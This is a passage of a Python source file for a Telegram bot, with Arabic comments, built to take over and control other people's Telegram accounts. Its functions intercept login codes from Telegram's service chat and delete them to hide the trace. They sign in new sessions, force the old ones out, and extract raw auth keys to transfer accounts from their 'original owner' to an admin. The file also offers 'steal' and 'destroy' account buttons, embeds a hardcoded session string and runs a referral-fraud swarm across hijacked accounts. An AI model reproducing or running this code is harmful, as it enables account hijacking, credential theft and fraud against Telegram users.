    if not ACTIVE_MONITORS.get(admin_id, False):
        try:
            bot.send_message(admin_id, "🛑 **تم إلغاء أو إنهاء عملية المراقبة وصيد الكنوز بنجاح.**")
        except Exception:
            pass





#داله تجديد الجلسات




# =========================================================
# ♻️ مـيـزة تـجـديـد الـجـلـسـات (Session Renewal) الـذكـيـة المحصنة
# =========================================================
import random

@bot.callback_query_handler(func=lambda call: call.data == "menu_renew_manage")
def renew_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    bot.edit_message_text(
        "🛂┊ **إدارة تـجـديـد الـجـلـسـات (Session Renewal):**\n\n"
        "⎉╎ الـمـيـزة تـقـوم بـإنـشـاء جـلـسـات جـديـدة كـلـيـاً لـلأمـان.\n"
        "⎉╎ تـسـحـب الـكـود، تـسـجـل الـدخـول، وتـنـتـحـر مـن الـقـديـمـة.\n"
        "•❐• اخـتـر الـحـسـابـات لـبـدء الـتـجـديـد:",
        call.message.chat.id, call.message.message_id,
        reply_markup=accounts_action_keyboard(call.from_user.id, "renew"),
        parse_mode="Markdown"
    )

async def renew_single_session(acc_id, phone, name, pyro_session):
    """المحرك الفعلي لتجديد الجلسة يعمل بالتوازي والمحصن ضد الثغرات والضغط"""
    
    # تأخير عشوائي (من 0.1 إلى 2.5 ثانية) لمنع ضرب سيرفرات تليجرام
    await asyncio.sleep(random.uniform(0.1, 2.5))
    
    async with account_semaphore:
        # no_updates=True تمنع التحديثات لحل مشكلة فصل الشبكة
        client_a = Client(f"old_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True, no_updates=True)
        client_b = Client(f"new_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=f"Secured_V4_{acc_id}", no_updates=True)

        try:
            await asyncio.wait_for(client_a.connect(), timeout=15)
            await asyncio.wait_for(client_b.connect(), timeout=15)

            request_time = time.time()
            sent_code = await client_b.send_code(phone)

            valid_codes = [] 
            
            for _ in range(6): 
                await asyncio.sleep(3)
                try:
                    async for msg in client_a.get_chat_history(777000, limit=5):
                        if msg.date and msg.date.timestamp() >= (request_time - 15):
                            if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                                match = re.search(r'\b(\d{5})\b', msg.text)
                                if match:
                                    code = match.group(1)
                                    if (code, msg.id) not in valid_codes:
                                        valid_codes.append((code, msg.id))
                except:
                    pass
                
                if valid_codes:
                    break

            if not valid_codes:
                return False, f"❌ `{phone}`: لـم يـصـل أي كـود جـديـد خـلال الـوقـت.", None

            valid_codes.sort(key=lambda x: x[1], reverse=True)

            logged_in = False
            msg_to_delete = None
            
            for code, msg_id in valid_codes:
                try:
                    await client_b.sign_in(phone, sent_code.phone_code_hash, code)
                    logged_in = True
                    msg_to_delete = msg_id
                    break 
                except Exception as e:
                    err_str = str(e).upper()
                    if "PHONE_CODE_INVALID" in err_str or "CODE_INVALID" in err_str:
                        continue 
                    elif "SESSION_PASSWORD_NEEDED" in err_str:
                        return False, f"⚠️ `{phone}`: يـوجـد تـحـقـق بـخـطـوتـيـن! الـتـجـديـد يـتـطـلـب إزالـتـه.", None
                    else:
                        raise e 

            if not logged_in:
                return False, f"❌ `{phone}`: جـمـيـع الأكـواد الـمـسـتـلـمـة كـانـت خـاطـئـة.", None

            me = await client_b.get_me()
            if not me:
                return False, f"❌ `{phone}`: فـشـل الـتـحـقـق مـن سـلامـة الـجـلـسـة الـجـديـدة.", None
                
            new_session_str = await client_b.export_session_string()

            if msg_to_delete:
                try: await client_a.delete_messages(777000, msg_to_delete)
                except: pass

            try:
                conn = get_db_conn()
                c = conn.cursor()
                c.execute("UPDATE sessions SET pyro_session=?, session_type='String' WHERE id=?", (new_session_str, acc_id))
                conn.commit()
                conn.close()
            except:
                return False, f"❌ `{phone}`: خـطـأ فـي قـاعـدة الـبـيـانـات.", None

            try:
                await client_a.invoke(functions.auth.LogOut())
            except: pass

            # إرجاع: (حالة النجاح, لا يوجد نص فخم هنا, كود السشن الخام)
            return True, "", new_session_str

        except Exception as e:
            err_str = str(e) if str(e).strip() else type(e).__name__
            err_str_lower = err_str.lower()
            
            if "flood" in err_str_lower or "fresh" in err_str_lower:
                return False, f"⚠️ `{phone}`: الحساب محظور مؤقتاً من طلب الأكواد (FloodWait).", None
            elif "timeout" in err_str_lower:
                return False, f"⚠️ `{phone}`: انـقـطـع الاتـصـال مـع تـلـيـجـرام (Timeout).", None
            elif "connection" in err_str_lower or "socket" in err_str_lower:
                return False, f"⚠️ `{phone}`: انقطاع مفاجئ بالشبكة، لم يتأثر الحساب.", None
            
            return False, f"❌ `{phone}`: {err_str[:40]}", None
            
        finally:
            if client_a.is_connected: 
                try: await client_a.disconnect()
                except: pass
            if client_b.is_connected: 
                try: await client_b.disconnect()
                except: pass

async def execute_renew_all_async(owner_id, chat_id, msg_id, target="all"):
    """دالة تجميع المهام وقذفها للشاشة"""
    accounts = get_all_accounts(owner_id)
    if target != "all":
        accounts = [acc for acc in accounts if str(acc[0]) == target]

    if not accounts:
        bot.edit_message_text("❌ لا تـوجـد حـسـابـات لـلـعـمـل عـلـيـهـا.", chat_id, msg_id)
        return

    # رسالة الانتظار بستايل زدثون
    bot.edit_message_text(f"⏳ **جـاري تـجـديـد وتـأمـيـن {len(accounts)} حـسـاب بـ 50 اتـصـال مـتـوازي...**", chat_id, msg_id, parse_mode="Markdown")

    tasks = [renew_single_session(acc[0], acc[1], acc[2], acc[4]) for acc in accounts]
    results = await asyncio.gather(*tasks)

    failed_msgs = []
    success_count = 0

    # قذف الجلسات الجديدة (السشن الخام في رسالة لوحده)
    for success, error_text, raw_session in results:
        if success:
            success_count += 1
            try:
                # إرسال كود الجلسة (Session) الخام فقط ليسهل تحويله
                bot.send_message(chat_id, raw_session)
                await asyncio.sleep(0.3)
            except: pass
        else:
            # تخزين الأخطاء لعرضها في التقرير الختامي
            failed_msgs.append(error_text)

    # تقرير ختامي للمهمة بستايل زدثون وعبارتك المطلوبة
    summary = (
        f"🛂┊ **تـم تـجـهـيـز الـجـلـسـات وتـأمـيـنـهـا !**\n\n"
        f"⎉╎ الـنـجـاح: `{success_count}`\n"
        f"⎉╎ الـفـشـل: `{len(failed_msgs)}`\n\n"
    )
    
    if failed_msgs:
        summary += "•❐• **تـفـاصـيـل الأخـطـاء:**\n" + "\n".join(failed_msgs)

    if len(summary) > 4000:
        summary = summary[:3900] + "\n... (تـم قـص بـاقـي الأخـطـاء)"

    bot.send_message(chat_id, summary, reply_markup=home_keyboard(owner_id), parse_mode="Markdown") 







# =========================================================
# 🧠 الدوال الذكية والمحركات المعقدة
# =========================================================

def get_creation_year(user_id):
    try:
        uid = int(user_id)
        if uid < 5000000: return "2013"
        elif uid < 50000000: return "2014"
        elif uid < 150000000: return "2015"
        elif uid < 300000000: return "2016"
        elif uid < 500000000: return "2017"
        elif uid < 750000000: return "2018"
        elif uid < 1000000000: return "2019"
        elif uid < 5000000000: return "2020 أو 2021"
        elif uid < 6000000000: return "2022"
        elif uid < 7000000000: return "2023"
        elif uid < 8000000000: return "2024"
        elif uid < 9000000000: return "2025"
        else: return "2026 (أو أحدث)"
    except Exception:
        return "غـيـر مـعـروف"

def get_dc_ip(dc_id):
    return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")

def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False)
    session = StringSession()
    session._dc_id, session._server_address, session._port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
    return base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("="), session.save()

async def extract_tdata_official(base_dir):
    if not OPENTELE_AVAILABLE: return None, None, None
    tdata_path = next((root for root, _, files in os.walk(base_dir) if 'key_datas' in files), None)
    if not tdata_path: return None, None, None
    try:
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded(): return None, None, None
        def get_real_auth(acc):
            auth_key = getattr(acc, 'authKey', getattr(acc, 'api', None))
            if auth_key:
                auth_key = getattr(auth_key, 'key', getattr(auth_key, 'auth_key', auth_key))
                dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', getattr(getattr(acc, 'api', None), 'dc_id', None))))
                if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id: return int(dc_id), auth_key, int(getattr(acc, 'UserId', getattr(acc, 'id', 9999)))
            return None, None, None
        for acc in (tdesk.accounts if hasattr(tdesk, 'accounts') else []) + ([tdesk.mainAccount] if hasattr(tdesk, 'mainAccount') else []):
            d, a, u = get_real_auth(acc)
            if d and a: return d, a, u
    except Exception: pass
    return None, None, None

def get_hex_from_pyro(pyro_session):
    try:
        data = base64.urlsafe_b64decode(pyro_session + "=" * (-len(pyro_session) % 4))
        auth_key = data[6:262]
        return auth_key.hex()
    except:
        return "غير متوفر"

async def confirm_session_death(pyro_session):
    await asyncio.sleep(1.5)
    test_client = Client(f"retry_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await asyncio.wait_for(test_client.connect(), timeout=8)
        await test_client.get_me()
        await test_client.disconnect()
        return False
    except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
        return True
    except Exception:
        return False

def handle_dead_session(owner_id, acc_id, phone, name):
    delete_account(acc_id)
    text = (f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n⎉╎ الاسـم: {name}\n⎉╎ الـرقـم: {phone}\n•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً.")
    try:
        bot.send_message(owner_id, text)
    except Exception:
        pass

def convert_telethon_to_pyrogram(session_str):
    if session_str.startswith("1") and len(session_str) > 300:
        try:
            padding = "=" * (-len(session_str[1:]) % 4)
            data = base64.urlsafe_b64decode(session_str[1:] + padding)
            ip_len = 4 if len(data) == 265 else 16
            dc_id, = struct.unpack(">B", data[:1])
            auth_key = data[1 + ip_len + 2:]
            pyro_session, _ = generate_sessions(API_ID, dc_id, auth_key)
            return pyro_session
        except Exception:
            pass
    return session_str

def log_to_channel(text, file_path=None, session_text=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                bot.send_document(LOG_CHANNEL, f, caption=text[:1024], parse_mode="Markdown")
        elif session_text:
            safe_text = f"```text\n{session_text}\n```\n\n{text[:800]}"
            bot.send_message(LOG_CHANNEL, safe_text, parse_mode="Markdown")
        else:
            bot.send_message(LOG_CHANNEL, text, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"فشل إرسال للقناة: {e}")

# =========================================================
# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت
# =========================================================

@bot.message_handler(func=lambda message: message.text and re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text))
def handle_hex_login(message):
    if not is_allowed(message.from_user.id):
        return

    match = re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text)
    hex_data = match.group(1)
    dc_id = int(match.group(2))

    msg = bot.reply_to(message, "⏳ جاري فحص الجلسة والاتصال...")

    async def process_hex():
        client = None
        try:
            auth_key_bytes = bytes.fromhex(hex_data)
            pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key_bytes)

            client = Client(f"temp_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
            await client.connect()

            me_raw = await client.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
            me = me_raw[0]

            phone = getattr(me, 'phone', "Unknown")
            if phone != "Unknown" and not phone.startswith("+"):
                phone = "+" + phone

            first_name = getattr(me, 'first_name', "Unknown")
            user_id = me.id
            year = get_creation_year(user_id)

            await client.disconnect()

            save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)

            text = (
                f"بوت اداره الجلسات المتقدم:\n"
                f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
                f"⎉╎ الاسـم: {first_name}\n"
                f"⎉╎ الـرقـم: {phone}\n"
                f"⎉╎ الآيـدي: {user_id}\n"
                f"•❐• سـنـة الإنـشـاء: {year}\n\n"
                f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه"
            )

            bot.delete_message(message.chat.id, msg.message_id)

            bot.send_message(
                message.chat.id, 
                text, 
                reply_markup=home_keyboard(message.from_user.id)
            )

        except Exception as e:
            if client and client.is_connected:
                await client.disconnect()
            bot.edit_message_text(f"❌ فشل تسجيل الدخول يرجى التأكد من الـ Hex!\nالسبب: {str(e)}", message.chat.id, msg.message_id)

    run_async(process_hex())

async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
    """محرك السحب الاحترافي - تجاوز 24 ساعة، اعتراض الكود، دعم 2FA، واستخراج مفتاح tdata، وانتحار الجلسة A"""

    B_DEVICE_MODEL = f"MigrationB_{acc_id}"
    client_b = None
    login_code = None
    msg_to_delete = None

    try:
        # [1] التأكد من اتصال الجلسة A
        if not client_a.is_connected:
            await client_a.connect()

        # [2] محاولة طرد الأجهزة الأخرى (وإذا لم يمر 24 ساعة نتجاهل الخطأ ونكمل السحب!)
        auths = await client_a.invoke(functions.account.GetAuthorizations())

        for auth in auths.authorizations:
            if not getattr(auth, 'current', False):
                try:
                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                    await asyncio.sleep(0.5) 
                except Exception as e:
                    err_str = str(e).lower()
                    if "flood" in err_str:
                        await asyncio.sleep(4)
                    else:
                        # نتجاهل خطأ الـ 24 ساعة (Fresh) ونكمل العملية لتسجيل الجلسة B
                        continue

        # [3] إنشاء الجلسة B وطلب كود الدخول
        client_b = Client(
            f"cb_{acc_id}_{int(time.time())}", 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=True,
            device_model=B_DEVICE_MODEL
        ) 

        await client_b.connect()
        sent_code = await client_b.send_code(phone)

        await asyncio.sleep(3.5)

        # [4] اعتراض الكود عبر الجلسة A وحذف الأثر فوراً
        async for msg in client_a.get_chat_history(777000, limit=3):
            if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                match = re.search(r'\b(\d{5})\b', msg.text)
                if match:
                    login_code = match.group(1)
                    msg_to_delete = msg
                    break

        if not login_code:
            raise Exception("لم يتم العثور على الكود في محادثة 777000.")

        # حذف رسالة الكود ومحادثة 777000 (محو الأثر)
        if msg_to_delete:
            try:
                await client_a.delete_messages(777000, msg_to_delete.id)
                peer = await client_a.resolve_peer(777000)
                await client_a.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, just_clear=True, revoke=True))
            except Exception:
                pass

        # [5] تسجيل دخول الجلسة B والتعامل مع التحقق بخطوتين (2FA)
        try:
            await client_b.sign_in(phone, sent_code.phone_code_hash, login_code)
        except SessionPasswordNeeded:
            # البوت يكتشف وجود تحقق بخطوتين ويطلب الباسوورد من الأدمن
            try:
                bot.send_message(
                    admin_id,
                    f"🔐 **تـحـقـق بـخـطـوتـيـن (2FA)**!\n\n"
                    f"⎉╎ الـرقـم: `{phone}`\n"
                    f"⎉╎ الاسـم: {name}\n\n"
                    f"•❐• أرسـل كـلـمـة سـر الـتـحـقـق خـطـوتـيـن الآن لـلـمـتـابـعـة (لـديـك دقيقتان):",
                    parse_mode="Markdown"
                )

                USER_STATES[admin_id] = {"action": "wait_for_2fa"}
                password = None
                for _ in range(60):
                    await asyncio.sleep(2)
                    if "2fa_pass" in USER_STATES.get(admin_id, {}):
                        password = USER_STATES[admin_id]["2fa_pass"]
                        del USER_STATES[admin_id]
                        break

                if not password:
                    raise asyncio.TimeoutError()

                # إدخال الباسوورد
                await client_b.check_password(password)
                bot.send_message(admin_id, "✅ تـم قـبـول الـبـاسـوورد بـنـجـاح، مـتـابـعـة الـتـهـجـيـر...")

            except asyncio.TimeoutError:
                bot.send_message(admin_id, f"⏳ انـتـهـى الـوقـت لـإدخـال بـاسـوورد `{phone}`. تـم إلـغـاء الـعـمـلـيـة.", parse_mode="Markdown")
                raise Exception("Admin did not provide 2FA password in time.")
            except Exception as e:
                raise Exception(f"فشل إدخال الباسوورد: {str(e)}")

        # [6] التحقق من صحة الجلسة B واستخراج المفاتيح
        me = await client_b.get_me()
        if not me or not me.id:
            raise Exception("فشل التحقق من الجلسة B عبر get_me!")

        target_dc = me.dc_id if me.dc_id else 2

        # استخراج الـ Session String
        session_b_str = await client_b.export_session_string()

        # استخراج مفتاح الـ AuthKey الخام (الخاص بـ tdata) بصيغة Hex + رقم السيرفر
        try:
            auth_key_bytes = client_b.session.auth_key.key
            hex_key_str = auth_key_bytes.hex()
            final_tdata_key = f"{hex_key_str} {target_dc}"
        except Exception:
            final_tdata_key = f"FAILED_TO_EXTRACT_HEX {target_dc}"

        # [7] انتحار الجلسة A عبر الـ Raw API (تسجيل خروج لتركيع B على العرش)
        try:
            await client_a.invoke(functions.auth.LogOut())
        except Exception:
            pass 

        if client_a.is_connected: 
            await client_a.disconnect()

        if client_b.is_connected:
            await client_b.disconnect()

        # [8] تحديث الداتا بيس لصالح الأدمن بالجلسة B الجديدة
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='', hex_key=? WHERE id=?", 
                  (session_b_str, admin_id, final_tdata_key, acc_id))
        conn.commit()
        conn.close()

        # [9] إرسال كليشة الضحية
        kick_msg = (
            f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
            f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
            f"⎉╎ الاسـم: {name}\n"
            f"⎉╎ الـرقـم: {phone}\n"
            f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
        )
        try: bot.send_message(original_owner, kick_msg)
        except Exception: pass

        # [10] إرسال كليشة النجاح للأدمن
        admin_msg = (
            f"✅ تـم الـسـحـب والـتـهـجـيـر بـنـجـاح (مـع الـتـحـقـق بـخـطـوتـيـن إن وجـد)!\n\n"
            f"⎉╎ الـرقـم: `{phone}`\n"
            f"⎉╎ الاسـم: {name}\n"
            f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
            f"🔑 مـفـتـاح tdata (HEX + DC):\n`{final_tdata_key}`\n\n"
            f"🔒 الـجـلـسـة (String):\n`{session_b_str}`\n\n"
            f"•❐• تـم مـسـح رسـالـة الـكـود، وتـسـجـيـل الـخـروج مـن جـلـسـة A، وتـركـيـع B عـلـى الـعـرش."
        )
        bot.send_message(admin_id, admin_msg, parse_mode="Markdown")

        return True

    except Exception as e:
        logging.error(f"Migration Failed for {phone}: {e}")

        # في حال فشلت العملية، نتأكد من إغلاق الجلسات لعدم ترك أي معلق
        if client_b and client_b.is_connected: 
            await client_b.disconnect()
        if client_a and client_a.is_connected: 
            await client_a.disconnect()

        try:
            bot.send_message(admin_id, f"❌ فشل التهجير للرقم `{phone}`\nالسبب: {str(e)}", parse_mode="Markdown")
        except Exception:
            pass

        return False




def home_keyboard(uid):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
    markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
    markup.row(InlineKeyboardButton("• إدارة الـريـسـت والـقـفـل 🔒", callback_data="menu_pass_reset_manage"))
    markup.row(InlineKeyboardButton("• إدارة الـسـبـام بـلـوك 🚫", callback_data="spam_manage"))
    markup.row(InlineKeyboardButton("• تـجـديـد الـجـلـسـات ♻️", callback_data="menu_renew_manage"))
    markup.row(InlineKeyboardButton("• نـظـام الإحـالات 🇺🇲", callback_data="referral_menu"))
    


    markup.row(InlineKeyboardButton("• إدارة فـحـص الـيـوزرات 🔠", callback_data="usernames_manage"))

    markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
    markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
    markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
    markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
    markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
    markup.row(InlineKeyboardButton("• أتمتة تغيير الإيميل السريع 📧", callback_data="auto_email_menu"))

    if uid in ADMIN_IDS:
        markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• تـدمـيـر الـحـسـابـات 🔴", callback_data="admin_destroy_accounts"))

        # 🔥 رجعنا حبيب الشعب (الشراء التلقائي LZT) هنا للآدمن
        markup.row(InlineKeyboardButton("🛒 تخصيص الشراء التلقائي (LZT)", callback_data="auto_buy_menu"))

        # إذا تبي زر تيك توك يرجع شيل علامة المربع (#) من السطر اللي تحت:
        # markup.row(InlineKeyboardButton("🎵 الشراء التلقائي (تيك توك)", callback_data="tt_auto_main"))

    return markup








#داله المنزل
#the house





#داله الاحالات هنا


# ==========================================
# 🇺🇲 نـظـام الإحـالات والـمـرآة الـشـامـلـة (V8 - الكشاف والسرب بالـ Raw API)
# شـامـل: الـ Mini Apps, الـتـنـظـيـف، إنـشـاء الـجـروبـات، الـتـفـاعـل، الانـضـمـام
# ==========================================
import re
import time
import asyncio
import threading
from pyrogram import Client, enums
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.raw import functions, types
from pyrogram.errors import FloodWait

DEFAULT_MASTER_SESSION = "BAG3abEApn9HAeUDClfSg0Yr3ayAz-xleU2bL19tQq3hpCHKUSUXxhMa7pwhyVQ2-puKcgL9gZmOfBJDblYBeGmf1Gx1cVT2dFmdlc264OLbPYTNilnPpBXgLthMNjfaeCSqUkzJZhTYMWCMKSwivuO7WqZ7X9l_REJMSDQKRfVgyucr2QOKpm2MWjI9SM9FMcbV_CY1Pmq7S9OiFM4a7gt0JMyG_cwZumiCJwfYV1y7lCjaYqDNYN8vU8nv5To8X2u5LzGqi2ssMhWjWoOT5E4jqgH8RPy9_e6W2VRMQStebxoziBOc_XNvJjagZIAjulB445efkGDPFanhiiIcmq3LPpNGVQAAAAAAAAAAAA"

REFERRAL_STATE = {}

def get_master_account(owner_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(''' CREATE TABLE IF NOT EXISTS master_accounts ( owner_id INTEGER PRIMARY KEY, phone TEXT, first_name TEXT, pyro_session TEXT ) ''')
    c.execute("SELECT phone, first_name, pyro_session FROM master_accounts WHERE owner_id=?", (owner_id,))
    row = c.fetchone()
    conn.close()
    if not row: return ("الرقم الافتراضي", "الماستر الثابت", DEFAULT_MASTER_SESSION)
    return row

def save_master_account(owner_id, phone, first_name, pyro_session):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(''' CREATE TABLE IF NOT EXISTS master_accounts ( owner_id INTEGER PRIMARY KEY, phone TEXT, first_name TEXT, pyro_session TEXT ) ''')
    c.execute("INSERT OR REPLACE INTO master_accounts (owner_id, phone, first_name, pyro_session) VALUES (?, ?, ?, ?)", (owner_id, phone, first_name, pyro_session))
    conn.commit()
    conn.close()

def referral_main_markup(uid):
    master = get_master_account(uid)
    master_name = master[1] if master else "غـيـر مـحـدد"
    state = REFERRAL_STATE.get(uid, {})
    is_running = state.get("is_running", False)
    markup = InlineKeyboardMarkup()
    
    if not is_running:
        markup.row(InlineKeyboardButton(f"👑 تـغـيـيـر الـحـسـاب الافـتـراضـي ({master_name})", callback_data="ref_change_master"))
        markup.row(InlineKeyboardButton("🚀 بـدء الـمـرآة والـمـراقـبـة الـشـامـلـة", callback_data="ref_start"))
    else:
        markup.row(InlineKeyboardButton("🛑 إيـقـاف الـمـرآة والـمـراقـبـة", callback_data="ref_stop"))
        
    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "referral_menu")
def referral_menu_handler(call):
    if not is_allowed(call.from_user.id): return
    text = (
        "🛂┊ **نـظـام الإحـالات والـمـرآة الـشـامـلـة 🇺🇲:**\n\n"
        "⎉╎ **الـتـقـلـيـد الـعـمـيـق:** (إنـشـاء جـروب، تـفـاعـل ريـاكـشـن، الانـضـمـام، إرسـال رسـائـل، حـظـر، مـسـح) الـكـل يـتـم تـقـلـيـده بـالـمـلـي!\n"
        "⎉╎ **غـرفـة الـقـيـادة (الـرسـائـل الـمـحـفـوظـة):** أرسـل فـيـهـا الأوامـر:\n"
        "`.do رابط_البوت` ⇦ لـبـدء مـهـمـة إحـالـة بـكـل الـحـسـابـات (خوارزمية السرب).\n"
        "`.do 20 رابط_البوت` ⇦ لـلـتـطـبـيـق بـ 20 حـسـاب فـقـط.\n"
        "`done` ⇦ إنـهـاء بـنـجـاح وتـنـظـيـف تـلـقـائـي.\n"
        "`false` ⇦ إنـهـاء بـفـشـل وتـنـظـيـف تـلـقـائـي."
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=referral_main_markup(call.from_user.id), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "ref_change_master")
def ref_change_master_handler(call):
    if not is_allowed(call.from_user.id): return
    accounts = get_all_accounts(call.from_user.id)
    if not accounts:
        bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة في البوت لتحديدها كحساب افتراضي!", show_alert=True)
        return

    markup = InlineKeyboardMarkup()
    for acc_id, phone, name, uid, pyro_sess in accounts:
        markup.row(InlineKeyboardButton(f"👤 {name} | {phone}", callback_data=f"ref_set_mst:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="referral_menu"))

    text = "🛂┊ **تـغـيـيـر الـحـسـاب الافـتـراضـي:**\n\n•❐• اخـتـر مـن حـسـابـاتـك الـمـسـجـلـة لـيـكـون هـو قـائـد الـمـراقـبـة (الـمـاسـتـر):"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("ref_set_mst:"))
def ref_set_master_callback(call):
    if not is_allowed(call.from_user.id): return
    acc_id = int(call.data.split(":")[1])
    acc = get_account(acc_id)
    if not acc:
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود أو تم حذفه!", show_alert=True)
        return
    save_master_account(call.from_user.id, acc[2], acc[4], acc[5])
    bot.answer_callback_query(call.id, f"✅ تم تعيين {acc[4]} كحساب افتراضي بنجاح!", show_alert=True)
    referral_menu_handler(call)

async def cleanup_campaign(uid):
    state = REFERRAL_STATE[uid]
    channels = state.get('joined_channels', [])
    bot_target = state.get('current_bot')
    accounts = get_all_accounts(uid)
    
    if not channels and not bot_target: return
    try: bot.edit_message_text("🧹 **جـاري تـنـظـيـف الـحـسـابـات (مـغـادرة الـقـنـوات ومـسـح الـبـوت)...**", state['chat_id'], state['msg_id'], parse_mode="Markdown")
    except: pass

    async def do_clean(acc_id, pyro_session):
        async with account_semaphore:
            client = Client(f"clean_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=8)
                for ch in channels:
                    try: await client.leave_chat(ch)
                    except: pass
                if bot_target:
                    try:
                        peer = await client.resolve_peer(bot_target)
                        await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                    except: pass
            except: pass
            finally:
                if client.is_connected: await client.disconnect()

    await asyncio.gather(*[do_clean(acc[0], acc[4]) for acc in accounts])
    state['joined_channels'] = []
    state['current_bot'] = None

async def mirror_action(uid, action, **kwargs):
    accounts = get_all_accounts(uid)
    async def worker(acc_id, pyro_session):
        async with account_semaphore:
            client = Client(f"mir_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=8)
                if action == "send_msg": await client.send_message(kwargs['chat_id'], kwargs['text'])
                elif action == "block": await client.block_user(kwargs['peer_id'])
                elif action == "unblock": await client.unblock_user(kwargs['peer_id'])
                elif action == "del_history":
                    peer = await client.resolve_peer(kwargs['peer_id'])
                    await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                elif action == "create_chat":
                    if kwargs.get('is_channel'): await client.create_channel(kwargs['title'], "Mirrored Channel")
                    else: await client.create_supergroup(kwargs['title'], "Mirrored Group")
                elif action == "join_chat": await client.join_chat(kwargs['chat_id_or_link'])
                elif action == "react": await client.send_reaction(chat_id=kwargs['peer_id'], message_id=kwargs['msg_id'], emoji=kwargs.get('emoji'))
            except: pass
            finally:
                if client.is_connected: await client.disconnect()
    await asyncio.gather(*[worker(acc[0], acc[4]) for acc in accounts])

# =========================================================================
# 🧠 الخوارزمية العبقرية (V8): الكشاف والسرب (عبر الـ Raw API الإجباري)
# =========================================================================

async def raw_join_chat(client, link):
